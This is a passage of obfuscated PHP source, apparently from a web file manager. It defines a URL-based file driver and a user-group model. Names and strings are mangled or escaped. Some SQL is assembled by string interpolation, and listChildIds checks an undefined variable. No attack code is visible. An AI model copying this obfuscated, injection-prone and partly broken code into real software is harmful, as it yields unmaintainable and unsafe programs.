function _isFolder($óƒ…è‡•) { $çôıŠÀ˜ =& $_SERVER[ßğøİ]; if ($óƒ…è‡• == $çôıŠÀ˜[12] || $óƒ…è‡• == $çôıŠÀ˜[8]) { return !0; } $“¹×’Œ = $this->_objectMeta($óƒ…è‡•); return isset($“¹×’Œ[$çôıŠÀ˜[33]]) && $“¹×’Œ[$çôıŠÀ˜[33]] == $çôıŠÀ˜[75] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($ûÚ¦áÓ = false) { } public function exist($×Û“âé«) { $ÌÙè‘¾™ = $this->info($×Û“âé«); return $ÌÙè‘¾™[$_SERVER[ßğøİ][201]]; } public function isFile($„©şÀ†È) { $¾Ä»õ = $this->info($„©şÀ†È); return $¾Ä»õ[$_SERVER[ßğøİ][201]]; } public function isFolder($ãºˆÁ×¹) { return !1; } public function size($û™ñˆÉô) { $Šûù†ûì = $this->info($û™ñˆÉô); return $Šûù†ûì[$_SERVER[ßğøİ][76]]; } public function info($ÚÉ‚ü‘ö) { return $this->infoParse($ÚÉ‚ü‘ö); } public function infoAuth($è±š¶çå) { return $this->infoParse($è±š¶çå); } public function infoWithChildren($õí©œº) { return $this->infoParse($õí©œº); } public function infoFull($¾Áï€—Ê) { return $this->infoParse($¾Áï€—Ê); } private function infoParse($È«õ”ê) { $êÙÇ¦”Ç =& $_SERVER[ßğøİ]; $¬’ÙãÇâ = $this->header($È«õ”ê); if (!$¬’ÙãÇâ || !$¬’ÙãÇâ[$êÙÇ¦”Ç[747]]) { return !1; } $Ğó³Å“– = _get($¬’ÙãÇâ, $êÙÇ¦”Ç[337], 0); $ÌÍ‚†å = array($êÙÇ¦”Ç[32] => $¬’ÙãÇâ[$êÙÇ¦”Ç[32]], $êÙÇ¦”Ç[84] => $È«õ”ê, $êÙÇ¦”Ç[33] => $êÙÇ¦”Ç[199], $êÙÇ¦”Ç[76] => intval($Ğó³Å“–), $êÙÇ¦”Ç[174] => get_path_ext($¬’ÙãÇâ[$êÙÇ¦”Ç[32]]), $êÙÇ¦”Ç[1378] => $Ğó³Å“– > 0 && $¬’ÙãÇâ[$êÙÇ¦”Ç[1500]], $êÙÇ¦”Ç[1379] => !1); return $ÌÍ‚†å; } private function header($Î×£İûĞ) { $×›Ñ™‘¯ =& $_SERVER[ßğøİ]; if (isset(self::$_cacheHeader[$Î×£İûĞ])) { return self::$_cacheHeader[$Î×£İûĞ]; } $’™Š®—÷ = isset($GLOBALS[$×›Ñ™‘¯[1501]]) ? $GLOBALS[$×›Ñ™‘¯[1501]] : !1; $GLOBALS[$×›Ñ™‘¯[1501]] = !0; self::$_cacheHeader[$Î×£İûĞ] = url_header($Î×£İûĞ); $GLOBALS[$×›Ñ™‘¯[1501]] = $’™Š®—÷; return self::$_cacheHeader[$Î×£İûĞ]; } public function hashSimple($„Šş¤øâ, $—ÃãÏğ‡ = false) { $¸–œƒˆ =& $_SERVER[ßğøİ]; $–ø™›Í  = $this->info($„Šş¤øâ); if (!$–ø™›Í  || !$–ø™›Í [$¸–œƒˆ[201]]) { return !1; } $ïšãˆ‡­ = $–ø™›Í [$¸–œƒˆ[76]]; $‡–”» = 200; $ıŞ“ÕÜ¯ = 50; if ($ïšãˆ‡­ <= $‡–”» * $ıŞ“ÕÜ¯) { return md5($this->fileSubstr($„Šş¤øâ, 0, $ïšãˆ‡­)) . $ïšãˆ‡­; } $á’ƒí“‹ = intval($ïšãˆ‡­ / $ıŞ“ÕÜ¯); $ÒäÅÉŸ¡ = $¸–œƒˆ[12]; $æÕï­¿‚ = timeFloat(); $˜ı˜û†Ç = 15; for ($Ü¹‚–¡ = 0; $Ü¹‚–¡ < $ıŞ“ÕÜ¯; $Ü¹‚–¡++) { if (timeFloat() - $æÕï­¿‚ > $˜ı˜û†Ç) { return !1; } $ƒÈ›ü¨¸ = $this->fileSubstr($„Šş¤øâ, $á’ƒí“‹ * $Ü¹‚–¡, $‡–”»); if (!$ƒÈ›ü¨¸) { return !1; } $ÒäÅÉŸ¡ .= $ƒÈ›ü¨¸; } $ÒäÅÉŸ¡ .= $this->fileSubstr($„Šş¤øâ, $ïšãˆ‡­ - $‡–”», $‡–”»); return md5($ÒäÅÉŸ¡) . $ïšãˆ‡­; } public function getContent($ŞÖÏ‡¡ù) { return $this->fileSubstr($ŞÖÏ‡¡ù); } public function fileSubstr($µĞû‹ºÛ, $äÎ¶×ü¬ = 0, $³Â€õœé = -1) { $³Ë°‹¡ª =& $_SERVER[ßğøİ]; $ŠÊ’·è = $this->info($µĞû‹ºÛ); if (!$ŠÊ’·è || !$ŠÊ’·è[$³Ë°‹¡ª[201]] && $ŠÊ’·è[$³Ë°‹¡ª[76]] > 1024 * 1024 * 10) { return !1; } if ($³Â€õœé === -1) { $³Â€õœé = $ŠÊ’·è[$³Ë°‹¡ª[76]]; } if ($³Â€õœé == 0) { return $³Ë°‹¡ª[12]; } $‡©ãñ¯ = array($³Ë°‹¡ª[1502] . $äÎ¶×ü¬ . $³Ë°‹¡ª[779] . ($äÎ¶×ü¬ + $³Â€õœé - 1)); $‹ ÔéÕ” = url_request($µĞû‹ºÛ, $³Ë°‹¡ª[230], !1, $‡©ãñ¯, !1, !1, 1); return $‹ ÔéÕ”[$³Ë°‹¡ª[1193]] ? $‹ ÔéÕ”[$³Ë°‹¡ª[1193]] : $³Ë°‹¡ª[12]; } public function download($®´¯±¯ò, $“ªÃÕÑ¶) { Downloader::start($®´¯±¯ò, $“ªÃÕÑ¶); return $“ªÃÕÑ¶; } } goto CˆÀ“§Œ; aì‰Ÿ»Üš: class GroupModel extends ModelBase { protected $tableName = "\x67\162\x6f\165\x70"; protected $tableMeta = array("\x74\x61\142\154\x65\116\x61\155\x65" => "\x67\x72\x6f\x75\x70\x5f\155\145\x74\x61", "\155\x65\x74\141\x46\151\x65\154\x64" => "\x67\162\x6f\x75\x70\111\104"); protected function cacheFunctionAlias($õÂáÚ›) { $ü¯šÕĞÕ =& $_SERVER[ßğøİ]; return array($ü¯šÕĞÕ[1906] => array($õÂáÚ›[0], $ü¯šÕĞÕ[1907]), $ü¯šÕĞÕ[1908] => array($õÂáÚ›[0], $ü¯šÕĞÕ[1909])); } protected function getInfo($Íúê¿²½, $«Ñßüš¸ = false) { $ÌÌŠé” = $this->getInfoSimple($Íúê¿²½); if (!$ÌÌŠé”) { return !1; } if ($«Ñßüš¸) { return $this->_listDataApplyItem($ÌÌŠé”); } return $this->cacheFunctionGet($_SERVER[ßğøİ][1910], $Íúê¿²½); } protected function getInfoSimple($€á¦÷¾‚, $€ô¥¹úş = false) { $»ã²Ã‰­ =& $_SERVER[ßğøİ]; if ($€ô¥¹úş) { $úÖ‹¡ø† = array($»ã²Ã‰­[1828] => intval($€á¦÷¾‚)); $­¨¥äÚ = $this->where($úÖ‹¡ø†)->find(); return is_array($­¨¥äÚ) ? $­¨¥äÚ : array(); } return $this->cacheFunctionGet($»ã²Ã‰­[1911], $€á¦÷¾‚); } protected function groupAdd($›üó¢™­) { $Ù›½Å­ş =& $_SERVER[ßğøİ]; if (!$›üó¢™­[$Ù›½Å­ş[432]] && isset($›üó¢™­[$Ù›½Å­ş[1828]]) && $›üó¢™­[$Ù›½Å­ş[1828]] == 1) { if ($»à÷˜È° = $this->getInfoSimple($›üó¢™­[$Ù›½Å­ş[1828]], !0)) { return $›üó¢™­[$Ù›½Å­ş[1828]]; } } else { $»à÷˜È° = $this->getInfoSimple($›üó¢™­[$Ù›½Å­ş[432]]); if (!$»à÷˜È°) { return !1; } } $ùÌñó¢ò = $Ù›½Å­ş[531]; if ($»à÷˜È°[$Ù›½Å­ş[521]]) { $ùÌñó¢ò = $»à÷˜È°[$Ù›½Å­ş[521]] . $»à÷˜È°[$Ù›½Å­ş[1828]] . $Ù›½Å­ş[50]; } $ƒ²ÒòÒõ = array($Ù›½Å­ş[420] => $this->groupNameAuto($›üó¢™­[$Ù›½Å­ş[432]], $›üó¢™­[$Ù›½Å­ş[32]]), $Ù›½Å­ş[401] => $›üó¢™­[$Ù›½Å­ş[432]], $Ù›½Å­ş[590] => $ùÌñó¢ò, $Ù›½Å­ş[1912] => $›üó¢™­[$Ù›½Å­ş[1815]], $Ù›½Å­ş[1913] => 0, $Ù›½Å­ş[1832] => 0); if (isset($›üó¢™­[$Ù›½Å­ş[1852]])) { $ƒ²ÒòÒõ[$Ù›½Å­ş[1852]] = $›üó¢™­[$Ù›½Å­ş[1852]]; } else { $‘àŸ˜— = $this->max($Ù›½Å­ş[1852]); if (!$‘àŸ˜—) { $‘àŸ˜— = 0; } $ƒ²ÒòÒõ[$Ù›½Å­ş[1852]] = $‘àŸ˜— + 1; } if (!empty($›üó¢™­[$Ù›½Å­ş[1828]])) { $ƒ²ÒòÒõ[$Ù›½Å­ş[1828]] = $›üó¢™­[$Ù›½Å­ş[1828]]; } $ı‹Ğ³î = $this->add($ƒ²ÒòÒõ); $this->setNamePinyin($ı‹Ğ³î, $ƒ²ÒòÒõ[$Ù›½Å­ş[32]]); if (isset($›üó¢™­[$Ù›½Å­ş[1914]])) { $this->metaSet($ı‹Ğ³î, array($Ù›½Å­ş[1914] => $›üó¢™­[$Ù›½Å­ş[1914]], $Ù›½Å­ş[1915] => $›üó¢™­[$Ù›½Å­ş[1915]])); unset($›üó¢™­[$Ù›½Å­ş[1914]]); unset($›üó¢™­[$Ù›½Å­ş[1915]]); } Model($Ù›½Å­ş[1327])->groupRootAdd($ı‹Ğ³î); return $ı‹Ğ³î; } protected function groupEdit($ë‹¸¢ˆı, $áİè¢ñ‚) { $ôÙŒ¹æˆ =& $_SERVER[ßğøİ]; $÷—ÑÌƒé = $this->getInfoSimple($ë‹¸¢ˆı); if (!$÷—ÑÌƒé) { return !1; } if (!empty($áİè¢ñ‚[$ôÙŒ¹æˆ[432]])) { $±³¸É²§ = $this->getInfoSimple($áİè¢ñ‚[$ôÙŒ¹æˆ[432]]); if (!$±³¸É²§) { return !1; } if ($÷—ÑÌƒé[$ôÙŒ¹æˆ[1828]] == $±³¸É²§[$ôÙŒ¹æˆ[1828]]) { return !1; } if ($áİè¢ñ‚[$ôÙŒ¹æˆ[432]] != $÷—ÑÌƒé[$ôÙŒ¹æˆ[432]]) { if ($±³¸É²§[$ôÙŒ¹æˆ[521]] !== $÷—ÑÌƒé[$ôÙŒ¹æˆ[521]] && strpos($±³¸É²§[$ôÙŒ¹æˆ[521]], $÷—ÑÌƒé[$ôÙŒ¹æˆ[521]] . $÷—ÑÌƒé[$ôÙŒ¹æˆ[1828]] . $ôÙŒ¹æˆ[50]) === 0) { return !1; } $áİè¢ñ‚[$ôÙŒ¹æˆ[590]] = $±³¸É²§[$ôÙŒ¹æˆ[521]] . $áİè¢ñ‚[$ôÙŒ¹æˆ[432]] . $ôÙŒ¹æˆ[50]; $this->_changeChildLevel($÷—ÑÌƒé, $±³¸É²§); } } if (isset($áİè¢ñ‚[$ôÙŒ¹æˆ[32]])) { $this->setNamePinyin($ë‹¸¢ˆı, $áİè¢ñ‚[$ôÙŒ¹æˆ[32]]); } if (isset($áİè¢ñ‚[$ôÙŒ¹æˆ[1914]])) { $this->metaSet($ë‹¸¢ˆı, array($ôÙŒ¹æˆ[1914] => $áİè¢ñ‚[$ôÙŒ¹æˆ[1914]], $ôÙŒ¹æˆ[1915] => $áİè¢ñ‚[$ôÙŒ¹æˆ[1915]])); unset($áİè¢ñ‚[$ôÙŒ¹æˆ[1914]]); unset($áİè¢ñ‚[$ôÙŒ¹æˆ[1915]]); } $this->_clearChildrenCache($÷—ÑÌƒé); return $this->where(array($ôÙŒ¹æˆ[1916] => $ë‹¸¢ˆı))->save($áİè¢ñ‚); } private function _clearChildrenCache($°û±Í‘“) { $‘Ú•èç÷ =& $_SERVER[ßğøİ]; $Œ±öéäÙ = array($‘Ú•èç÷[590] => array($‘Ú•èç÷[550], $°û±Í‘“[$‘Ú•èç÷[521]] . $°û±Í‘“[$‘Ú•èç÷[1828]] . $‘Ú•èç÷[551])); $î¥Èç’ = $this->field($‘Ú•èç÷[1828])->where($Œ±öéäÙ)->select(); foreach ($î¥Èç’ as $şœÅŒ¸¨) { $this->_clearCache($şœÅŒ¸¨[$‘Ú•èç÷[1828]]); } } private function _clearCache($¦Õıßƒö) { $ì¸‡šĞŠ =& $_SERVER[ßğøİ]; $this->cacheFunctionClear($ì¸‡šĞŠ[1910], $¦Õıßƒö); $this->cacheFunctionClear($ì¸‡šĞŠ[1911], $¦Õıßƒö); } private function _changeChildLevel($±Çè·‚Æ, $œ£Ğ—ö†, $Éá€¡¿£ = false) { $°èÙıİ =& $_SERVER[ßğøİ]; $ş¹öª¸ö = $±Çè·‚Æ[$°èÙıİ[521]] . $±Çè·‚Æ[$°èÙıİ[1828]] . $°èÙıİ[50]; $üïİƒ = $œ£Ğ—ö†[$°èÙıİ[521]] . $œ£Ğ—ö†[$°èÙıİ[1828]] . $°èÙıİ[50] . $±Çè·‚Æ[$°èÙıİ[1828]] . $°èÙıİ[50]; if ($Éá€¡¿£) { $üïİƒ = $œ£Ğ—ö†[$°èÙıİ[521]] . $œ£Ğ—ö†[$°èÙıİ[1828]] . $°èÙıİ[50]; } $Á‚›š½ = array($°èÙıİ[590] => array($°èÙıİ[550], $±Çè·‚Æ[$°èÙıİ[521]] . $±Çè·‚Æ[$°èÙıİ[1828]] . $°èÙıİ[551])); $¨ò¨¶‹ = array($°èÙıİ[590] => array($°èÙıİ[599], "\162\x65\160\x6c\x61\x63\x65\50\x70\141\162\x65\x6e\164\x4c\145\x76\x65\x6c\x2c\47{$ş¹öª¸ö}\47\54\47{$üïİƒ}\x27\x29")); $this->_clearChildrenCache($±Çè·‚Æ); $this->where($Á‚›š½)->data($¨ò¨¶‹)->save(); } public function setNamePinyin($î¹ß«–×, $³—ö• = false) { $‘²ˆ‚™ =& $_SERVER[ßğøİ]; if (!$³—ö•) { $Ç“™¬É® = $this->getInfoSimple($î¹ß«–×); $³—ö• = $Ç“™¬É®[$‘²ˆ‚™[32]]; } if (!Input::check($³—ö•, $‘²ˆ‚™[593])) { $this->metaSet($î¹ß«–×, $‘²ˆ‚™[465], null); $this->metaSet($î¹ß«–×, $‘²ˆ‚™[464], null); return; } $Šï¨õÖ† = array($‘²ˆ‚™[465] => str_replace($‘²ˆ‚™[53], $‘²ˆ‚™[12], Pinyin::get($³—ö•)), $‘²ˆ‚™[464] => Pinyin::get($³—ö•, $‘²ˆ‚™[594])); $this->metaSet($î¹ß«–×, $Šï¨õÖ†); } protected function groupStatus($‰ö¾‚¥, $äÖø¡ŸÁ) { $…©¿é’ =& $_SERVER[ßğøİ]; $áêœËœ = $this->getInfoSimple($‰ö¾‚¥); if (!$áêœËœ) { return !1; } if ($äÖø¡ŸÁ == $…©¿é’[88]) { $¹©–Ş¡² = $this->parentLevelArray($áêœËœ[$…©¿é’[521]]); } else { $ùõıˆ× = array($…©¿é’[590] => array($…©¿é’[550], $áêœËœ[$…©¿é’[521]] . $áêœËœ[$…©¿é’[1828]] . $…©¿é’[551])); $¹©–Ş¡² = $this->where($ùõıˆ×)->field($…©¿é’[1828])->select(); $¹©–Ş¡² = array_to_keyvalue($¹©–Ş¡², $…©¿é’[12], $…©¿é’[1828]); } $¹©–Ş¡²[] = $áêœËœ[$…©¿é’[1828]]; $›åç§°¾ = array(); foreach ($¹©–Ş¡² as $‰ö¾‚¥) { $›åç§°¾[] = array($…©¿é’[1828] => $‰ö¾‚¥, $…©¿é’[94] => $…©¿é’[747], $…©¿é’[374] => $äÖø¡ŸÁ); $this->_clearCache($‰ö¾‚¥); } return Model($…©¿é’[1917])->addAll($›åç§°¾, array(), !0); } protected function groupRemove($¸€¦ü¥ß, $¼ ¼¼È = false) { $åŸ¨î„ =& $_SERVER[ßğøİ]; $ÆÅ‡İøÅ = array($åŸ¨î„[1828] => $¸€¦ü¥ß); $“î÷ëç“ = $this->where($ÆÅ‡İøÅ)->find(); if (!$“î÷ëç“ || $“î÷ëç“[$åŸ¨î„[432]] == 0) { return !1; } if (!$¼ ¼¼È) { $Ë¼¼êÂ§ = $this->getInfoSimple($“î÷ëç“[$åŸ¨î„[432]]); $this->_changeChildLevel($“î÷ëç“, $Ë¼¼êÂ§, !0); $this->where(array($åŸ¨î„[432] => $¸€¦ü¥ß))->save(array($åŸ¨î„[432] => $“î÷ëç“[$åŸ¨î„[432]])); } Model($åŸ¨î„[1917])->where($ÆÅ‡İøÅ)->delete(); Model($åŸ¨î„[1918])->where($ÆÅ‡İøÅ)->delete(); Model($åŸ¨î„[822])->groupRootRemove($¸€¦ü¥ß); return $this->where($ÆÅ‡İøÅ)->delete(); } protected function groupSort($ŸñğËß’) { $Å‘ÍíĞ =& $_SERVER[ßğøİ]; $ê«ĞÔ· = array(); foreach ($ŸñğËß’ as $ŸÛóÍ è => $úÁÆ’­¿) { $ê«ĞÔ·[] = array($Å‘ÍíĞ[1828], $úÁÆ’­¿, $Å‘ÍíĞ[1852], $ŸÛóÍ è + 1); } $this->saveAll($ê«ĞÔ·); } public function listData() { $¸ì®åÆ’ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($¸ì®åÆ’[$_SERVER[ßğøİ][369]]); return $¸ì®åÆ’; } private function _makeOrder($¨´ˆù„ñ = '') { $ëëˆ¸œ× =& $_SERVER[ßğøİ]; $íŞ†´÷ô = array($ëëˆ¸œ×[1828], $ëëˆ¸œ×[32], $ëëˆ¸œ×[1817], $ëëˆ¸œ×[200]); $¨ÑÄ›×û = array($ëëˆ¸œ×[450] => $ëëˆ¸œ×[451], $ëëˆ¸œ×[452] => $ëëˆ¸œ×[453]); $‚éÜç‘ƒ = Input::get($ëëˆ¸œ×[457], $ëëˆ¸œ×[7], $ëëˆ¸œ×[1832], $íŞ†´÷ô); $®é¯èğÚ = Input::get($ëëˆ¸œ×[458], $ëëˆ¸œ×[7], $ëëˆ¸œ×[1919], array($ëëˆ¸œ×[1919], $ëëˆ¸œ×[452])); $®é¯èğÚ = $¨ÑÄ›×û[$®é¯èğÚ]; $¨´ˆù„ñ = $¨´ˆù„ñ . "{$‚éÜç‘ƒ}\40{$®é¯èğÚ}\x2c\40\x67\x72\157\165\x70\x49\104\x20\141\163\x63"; return $this->order($¨´ˆù„ñ); } public function listChild($ñ¦á®‰Ó) { $‘ÖÀÊÅ =& $_SERVER[ßğøİ]; $›€İ»¢õ = $this->where(array($‘ÖÀÊÅ[432] => $ñ¦á®‰Ó))->_makeOrder()->selectPage(200); $this->_listDataApply($›€İ»¢õ[$‘ÖÀÊÅ[369]]); return $›€İ»¢õ; } public function listChildIds($¡¹“¼Òı) { $ì€ËÔ© =& $_SERVER[ßğøİ]; if (is_string($£òïÓÏ)) { $¡¹“¼Òı = explode($ì€ËÔ©[50], $¡¹“¼Òı); } $Ñí†˜‘ = $this->where(array($ì€ËÔ©[1828] => array($ì€ËÔ©[7], $¡¹“¼Òı)))->field($ì€ËÔ©[1920])->select(); if (!$Ñí†˜‘) { return !1; } $¢»ø¶¶ = array(); foreach ($Ñí†˜‘ as $ğï½×—Ø) { $¢»ø¶¶[] = "\x73\145\154\145\x63\164\x20\147\x72\x6f\165\160\x49\x44\40\146\x72\157\x6d\40\x60\147\162\x6f\x75\160\140\x20\167\150\x65\x72\x65\x20\160\x61\162\145\156\x74\114\x65\166\x65\x6c\40\154\151\153\x65\x20\x27{$ğï½×—Ø[$ì€ËÔ©[521]]}{$ğï½×—Ø[$ì€ËÔ©[1828]]}\x2c\45\x27"; } $¢»ø¶¶ = implode($ì€ËÔ©[1921], $¢»ø¶¶); $Ñí†˜‘ = $this->query($¢»ø¶¶); if (!$Ñí†˜‘) { return array(); } $¡¹“¼Òı = array_to_keyvalue($Ñí†˜‘, $ì€ËÔ©[12], $ì€ËÔ©[1828]); return array_unique($¡¹“¼Òı); } public function listByID($ä·‚Ì“¹) { $“¹ã©«ç =& $_SERVER[ßğøİ]; if (!$ä·‚Ì“¹) { return array(); } $İÈ²¨¾± = array($“¹ã©«ç[1828] => array($“¹ã©«ç[7], $ä·‚Ì“¹)); $ÑäâËóÊ = $this->where($İÈ²¨¾±)->select(); $ÑäâËóÊ = array_sort_keep($ÑäâËóÊ, $“¹ã©«ç[1828], $ä·‚Ì“¹); $this->_listDataApply($ÑäâËóÊ); return $ÑäâËóÊ; } public function listSearch($á‘ã€Â·) { $•é›ôŠÚ =& $_SERVER[ßğøİ]; $Î£’¦ƒ = $á‘ã€Â·[$•é›ôŠÚ[1922]]; $–æŒØ‡Ü = isset($á‘ã€Â·[$•é›ôŠÚ[1923]]) ? $á‘ã€Â·[$•é›ôŠÚ[1923]] : !1; if (!trim($Î£’¦ƒ)) { return !1; } $Î£’¦ƒ = str_replace($•é›ôŠÚ[1924], $•é›ôŠÚ[1925], $Î£’¦ƒ); $¯ø£İº = array($•é›ôŠÚ[1828] => array($•é›ôŠÚ[383], "{$Î£’¦ƒ}\45"), $•é›ôŠÚ[32] => array($•é›ôŠÚ[383], "\45{$Î£’¦ƒ}\x25"), $•é›ôŠÚ[1000] => $•é›ôŠÚ[1926]); if ($–æŒØ‡Ü) { $Ş…²šÃæ = $this->getInfoSimple($–æŒØ‡Ü); $´ô˜ª®Ê = $Ş…²šÃæ[$•é›ôŠÚ[521]] . $–æŒØ‡Ü . $•é›ôŠÚ[551]; $¯ø£İº = array($¯ø£İº, array($•é›ôŠÚ[521] => array($•é›ôŠÚ[383], $´ô˜ª®Ê))); } $¯ø£İº = $this->parseWhereLike($¯ø£İº); $Â‰ñ•ÁÚ = $this->_makeOrder()->where($¯ø£İº)->selectPage(20); $Â‰ñ•ÁÚ = $Â‰ñ•ÁÚ ? $Â‰ñ•ÁÚ : array($•é›ôŠÚ[369] => array(), $•é›ôŠÚ[366] => array()); if (!$Â‰ñ•ÁÚ || count($Â‰ñ•ÁÚ[$•é›ôŠÚ[369]]) < 5 && Input::check($Î£’¦ƒ, $•é›ôŠÚ[318])) { $í—Ÿ‰ÏÊ = $this->groupChildrenAll($–æŒØ‡Ü); $Ğ‡éÆÚ = $this->_searchFromMeta($•é›ôŠÚ[464], $Î£’¦ƒ, 10, $í—Ÿ‰ÏÊ); $àÏõ¢‡æ = $this->_searchFromMeta($•é›ôŠÚ[465], $Î£’¦ƒ, 10, $í—Ÿ‰ÏÊ); $ÏÙøÒşŸ = array_merge($Ğ‡éÆÚ, $àÏõ¢‡æ, $Â‰ñ•ÁÚ[$•é›ôŠÚ[369]]); $Â‰ñ•ÁÚ[$•é›ôŠÚ[369]] = array_unique_by_key($ÏÙøÒşŸ, $•é›ôŠÚ[1828]); $Â‰ñ•ÁÚ[$•é›ôŠÚ[366]][$•é›ôŠÚ[367]] = count($Â‰ñ•ÁÚ[$•é›ôŠÚ[369]]); $Â‰ñ•ÁÚ[$•é›ôŠÚ[366]][$•é›ôŠÚ[368]] = ceil($Â‰ñ•ÁÚ[$•é›ôŠÚ[366]][$•é›ôŠÚ[367]] / $Â‰ñ•ÁÚ[$•é›ôŠÚ[366]][$•é›ôŠÚ[363]]); } $this->_listDataApply($Â‰ñ•ÁÚ[$•é›ôŠÚ[369]]); return $Â‰ñ•ÁÚ; } protected function groupChildrenAll($³ğ•‰•Ÿ) { $İÎÅŞŒ =& $_SERVER[ßğøİ]; if (!$³ğ•‰•Ÿ) { return !1; } if (is_string($³ğ•‰•Ÿ)) { $³ğ•‰•Ÿ = array($³ğ•‰•Ÿ); } $°÷À‘å = $³ğ•‰•Ÿ; foreach ($³ğ•‰•Ÿ as $û¹¾„ÉÏ) { $ŠšÀ¹¾Ö = $this->getInfoSimple($û¹¾„ÉÏ); $•òÑÑÌù = array($İÎÅŞŒ[521] => array($İÎÅŞŒ[383], $ŠšÀ¹¾Ö[$İÎÅŞŒ[521]] . $û¹¾„ÉÏ . $İÎÅŞŒ[551])); $¦îÂ¶ºÔ = $this->field($İÎÅŞŒ[1828])->where($•òÑÑÌù)->select(); $°÷À‘å = array_merge($°÷À‘å, array_to_keyvalue($¦îÂ¶ºÔ, $İÎÅŞŒ[12], $İÎÅŞŒ[1828])); } return array_unique($°÷À‘å); } private function _searchFromMeta($™€¥Ò§Ş, $¾…şè«, $˜¿ÏğÊ, $†‚ã®ıÖ) { $‰¶Ê£†ê =& $_SERVER[ßğøİ]; $¾…şè« = strtolower($¾…şè«); $³µ™ô¡ = array($‰¶Ê£†ê[94] => $™€¥Ò§Ş, $‰¶Ê£†ê[374] => array($‰¶Ê£†ê[383], "\x25{$¾…şè«}\x25")); $³µ™ô¡ = $this->parseWhereLike($³µ™ô¡); if ($†‚ã®ıÖ) { $³µ™ô¡[$‰¶Ê£†ê[1828]] = array($‰¶Ê£†ê[7], $†‚ã®ıÖ); } $„Œ¶Â±Ó = Model($‰¶Ê£†ê[1927])->where($³µ™ô¡)->limit($˜¿ÏğÊ)->select(); if (!$„Œ¶Â±Ó) { return array(); } $„Œ¶Â±Ó = array_to_keyvalue($„Œ¶Â±Ó, $‰¶Ê£†ê[12], $‰¶Ê£†ê[1828]); $ßø¶äª† = $this->where(array($‰¶Ê£†ê[1916] => array($‰¶Ê£†ê[7], $„Œ¶Â±Ó)))->select(); if (!$ßø¶äª†) { return array(); } return $ßø¶äª†; } protected function _listDataApplyItem($°İÚÏ·Ù) { $×ÅÚ‡–â = array($°İÚÏ·Ù); $this->_listDataApply($×ÅÚ‡–â); return $×ÅÚ‡–â[0]; } protected function _listDataApply(&$ÌÖ¶õÈ) { $ş’ÈÄõ¢ =& $_SERVER[ßğøİ]; if (!$ÌÖ¶õÈ) { return; } $±¢”ïìğ = array_to_keyvalue($ÌÖ¶õÈ, $ş’ÈÄõ¢[12], $ş’ÈÄõ¢[1828]); $this->_listAppendChildren($ÌÖ¶õÈ); $this->_listAppendChildrenMember($ÌÖ¶õÈ); $this->_listAppendMeta($ÌÖ¶õÈ, $±¢”ïìğ); $this->_listAppendParent($ÌÖ¶õÈ); $this->_listAppendSourceRoot($ÌÖ¶õÈ, $±¢”ïìğ); } private function _listAppendChildren(&$ÉíÖÄŠú) { $â œ…† =& $_SERVER[ßğøİ]; $òÄ´óÁÍ = array_to_keyvalue($ÉíÖÄŠú, $â œ…†[12], $â œ…†[1828]); $›¶ØæÍÍ = array($â œ…†[432] => array($â œ…†[7], $òÄ´óÁÍ)); $ö·éè¸½ = array($â œ…†[432], $â œ…†[1928] => $â œ…†[500]); $ªÎë Ã = $this->field($ö·éè¸½)->where($›¶ØæÍÍ)->group($â œ…†[432])->select(); $¼›ŠüĞ® = array_to_keyvalue($ªÎë Ã, $â œ…†[432], $â œ…†[500]); foreach ($ÉíÖÄŠú as &$œ¡¡ ) { $Ñç³Õ¿³ = $œ¡¡ [$â œ…†[1828]]; $œ¡¡ [$â œ…†[1929]] = isset($¼›ŠüĞ®[$Ñç³Õ¿³]) ? intval($¼›ŠüĞ®[$Ñç³Õ¿³]) : !1; } unset($œ¡¡ ); } private function _listAppendChildrenMember(&$ÕãÏ‰í–) { $Î¢Òñ¦È =& $_SERVER[ßğøİ]; $ë§Í¡Üì = array_to_keyvalue($ÕãÏ‰í–, $Î¢Òñ¦È[12], $Î¢Òñ¦È[1828]); $øñ—¯£Ë = array($Î¢Òñ¦È[1828] => array($Î¢Òñ¦È[7], $ë§Í¡Üì)); $ÂÄ€óü¥ = array($Î¢Òñ¦È[1828], $Î¢Òñ¦È[1928] => $Î¢Òñ¦È[500]); $¥ßÃ¸îò = Model($Î¢Òñ¦È[1918])->field($ÂÄ€óü¥)->where($øñ—¯£Ë)->group($Î¢Òñ¦È[1828])->select(); $¹ãšˆãò = array_to_keyvalue($¥ßÃ¸îò, $Î¢Òñ¦È[1828], $Î¢Òñ¦È[500]); foreach ($ÕãÏ‰í– as &$ŒøÁßéÇ) { $é·€÷‹û = $ŒøÁßéÇ[$Î¢Òñ¦È[1828]]; $ŒøÁßéÇ[$Î¢Òñ¦È[1930]] = isset($¹ãšˆãò[$é·€÷‹û]) ? intval($¹ãšˆãò[$é·€÷‹û]) : !1; } unset($ŒøÁßéÇ); } private function _listAppendMeta(&$øÊ†¶‡º, $½Øôô) { $Â‘ü¿ØÚ =& $_SERVER[ßğøİ]; $Èí€‘²­ = array($Â‘ü¿ØÚ[1828] => array($Â‘ü¿ØÚ[7], $½Øôô)); $¯‚ÚçÏ = Model($Â‘ü¿ØÚ[1917])->where($Èí€‘²­)->select(); $¯‚ÚçÏ = array_to_keyvalue_group($¯‚ÚçÏ, $Â‘ü¿ØÚ[1828]); foreach ($¯‚ÚçÏ as &$öËÁÓû) { $öËÁÓû = array_to_keyvalue($öËÁÓû, $Â‘ü¿ØÚ[94], $Â‘ü¿ØÚ[374]); } unset($öËÁÓû); foreach ($øÊ†¶‡º as &$Ô¬‡Ø¢) { $Ô¬‡Ø¢[$Â‘ü¿ØÚ[466]] = array(); if (isset($¯‚ÚçÏ[$Ô¬‡Ø¢[$Â‘ü¿ØÚ[1828]]])) { $Ô¬‡Ø¢[$Â‘ü¿ØÚ[466]] = $¯‚ÚçÏ[$Ô¬‡Ø¢[$Â‘ü¿ØÚ[1828]]]; } } unset($Ô¬‡Ø¢); } protected function parentLevelArray($Â˜ÎÇ¬ë) { $‚·ø´Ÿ¦ =& $_SERVER[ßğøİ]; $Â˜ÎÇ¬ë = explode($‚·ø´Ÿ¦[50], trim($Â˜ÎÇ¬ë, $‚·ø´Ÿ¦[50])); $Â˜ÎÇ¬ë = array_remove_value($Â˜ÎÇ¬ë, $‚·ø´Ÿ¦[197]); return $Â˜ÎÇ¬ë; } protected function parentInGroup($¤¸¬÷’¬, $·Š™š‚Á) { $Èãİ³˜… =& $_SERVER[ßğøİ]; $ÌÅ®¹÷û = $this->getInfoSimple($¤¸¬÷’¬); if 